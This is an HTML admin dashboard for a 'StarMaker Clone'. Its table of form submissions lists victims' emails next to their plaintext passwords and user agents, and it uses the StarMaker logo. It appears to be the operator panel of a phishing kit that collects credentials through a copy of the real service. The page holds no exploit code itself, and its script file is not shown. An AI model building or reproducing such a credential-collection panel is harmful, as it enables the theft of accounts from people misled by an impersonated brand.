<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>StarMaker Clone Admin</title>
    <link rel="stylesheet" href="admin.css">
</head>
<body>
    <main class="admin-shell">
        <section class="admin-login" id="login-section">
            <div class="brand">
                <img src="logo.svg" alt="StarMaker" class="brand-logo">
                <h1>Admin Panel</h1>
            </div>
            <form id="admin-login-form" class="panel">
                <label>
                    Username
                    <input type="text" id="admin-username" autocomplete="username" required>
                </label>
                <label>
                    Password
                    <input type="password" id="admin-password" autocomplete="current-password" required>
                </label>
                <button type="submit">Log in</button>
                <p class="message" id="login-message"></p>
            </form>
        </section>

        <section class="dashboard hidden" id="dashboard-section">
            <header class="dashboard-header">
                <div>
                    <p class="eyebrow">StarMaker Clone</p>
                    <h1>Form Submissions</h1>
                </div>
                <div class="header-actions">
                    <button type="button" id="refresh-btn">Refresh</button>
                    <button type="button" id="logout-btn" class="secondary">Log out</button>
                </div>
            </header>

            <div class="stats-row">
                <div class="stat-box">
                    <span id="submission-count">0</span>
                    <p>Total submissions</p>
                </div>
            </div>

            <div class="table-wrap">
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Email</th>
                            <th>Submitted</th>
                            <th>Password</th>
                            <th>User Agent</th>
                        </tr>
                    </thead>
                    <tbody id="submissions-body">
                        <tr>
                            <td colspan="5">No submissions yet.</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </section>
    </main>

    <script src="admin.js"></script>
</body>
</html>
